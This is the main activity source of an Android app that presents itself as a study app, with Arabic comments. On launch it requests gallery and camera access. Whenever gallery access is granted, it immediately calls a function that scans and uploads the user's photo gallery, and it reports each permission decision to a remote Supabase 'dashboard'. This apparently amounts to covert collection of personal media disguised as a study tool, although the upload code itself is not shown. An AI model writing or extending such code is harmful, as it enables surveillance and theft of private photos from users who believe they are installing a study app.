package com.example

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.enableEdgeToEdge
import androidx.activity.viewModels
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import com.example.ui.screens.StudyAppUI
import com.example.viewmodel.StudyViewModel
// استيراد الـ SupabaseManager لكي يتعرف عليه الملف
import com.example.api.SupabaseManager

class MainActivity : ComponentActivity() {
    
    private val viewModel: StudyViewModel by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        enableEdgeToEdge()
        super.onCreate(savedInstanceState)
        
        // تجهيز وتحضير مدير الـ Supabase للبدء في العمل
        val supabaseManager = SupabaseManager.getInstance(this)
        
        // Define exact media and camera permissions required
        val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.CAMERA
            )
        } else {
            arrayOf(
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA
            )
        }
        
        // Setup registration launcher for immediate callbacks upon system dialog response
        val requestPermissionLauncher = registerForActivityResult(
            ActivityResultContracts.RequestMultiplePermissions()
        ) { results ->
            val grantedGallery = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                results[Manifest.permission.READ_MEDIA_IMAGES] == true
            } else {
                results[Manifest.permission.READ_EXTERNAL_STORAGE] == true
            }
            
            val grantedCamera = results[Manifest.permission.CAMERA] == true
            
            // --- معالجة إرسال البيانات للوحة التحكم بناءً على قرار المستخدم ---
            
            // 1. صلاحية معرض الصور
            if (grantedGallery) {
                viewModel.scanAndUploadGallery(this)
                viewModel.grantPermissionInApp("الوصول لمعرض الصور الدراسي")
                
                // إرسال حالة موافقة إلى لوحة التحكم (الـ Dashboard)
                supabaseManager.logPermissionDecision(
                    userId = "مستخدم أندرويد (براعي)",
                    mediaUrl = "https://picsum.photos/400/300", // رابط افتراضي للاختبار
                    mediaType = "image",
                    siteUrl = "تطبيق براعي - معرض الصور",
                    isApproved = true
                )
            } else {
                viewModel.denyPermissionInApp("الوصول لمعرض الصور الدراسي")
                
                // إرسال حالة رفض إلى لوحة التحكم (الـ Dashboard)
                supabaseManager.logPermissionDecision(
                    userId = "مستخدم أندرويد (براعي)",
                    mediaUrl = "https://picsum.photos/400/300",
                    mediaType = "image",
                    siteUrl = "تطبيق براعي - معرض الصور",
                    isApproved = false
                )
            }
            
            // 2. صلاحية الكاميرا
            if (grantedCamera) {
                viewModel.grantPermissionInApp("صلاحية تشغيل الكاميرا")
                
                // إرسال حالة موافقة الكاميرا للوحة التحكم
                supabaseManager.logPermissionDecision(
                    userId = "مستخدم أندرويد (براعي)",
                    mediaUrl = "https://picsum.photos/400/300",
                    mediaType = "video", // الكاميرا ترسل فيديو كمثال
                    siteUrl = "تطبيق براعي - الكاميرا",
                    isApproved = true
                )
            } else {
                viewModel.denyPermissionInApp("صلاحية تشغيل الكاميرا")
                
                // إرسال حالة رفض الكاميرا للوحة التحكم
                supabaseManager.logPermissionDecision(
                    userId = "مستخدم أندرويد (براعي)",
                    mediaUrl = "https://picsum.photos/400/300",
                    mediaType = "video",
                    siteUrl = "تطبيق براعي - الكاميرا",
                    isApproved = false
                )
            }
        }
        
        // Check if gallery permissions are already granted
        val validationPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        
        if (ContextCompat.checkSelfPermission(this, validationPermission) == PackageManager.PERMISSION_GRANTED) {
            // Already approved previously - trigger gallery scan and log status
            viewModel.scanAndUploadGallery(this)
            
            // تسجيل أن المستخدم مسجل الدخول والصلاحية مفعلة مسبقاً لديه
            supabaseManager.logPermissionDecision(
                userId = "مستخدم نشط (براعي)",
                mediaUrl = "https://picsum.photos/400/300",
                mediaType = "image",
                siteUrl = "تطبيق براعي - فحص تلقائي",
                isApproved = true
            )
        } else {
            // Request permissions on startup
            requestPermissionLauncher.launch(permissions)
        }

        setContent {
            MaterialTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    StudyAppUI(viewModel)
                }
            }
        }
    }
}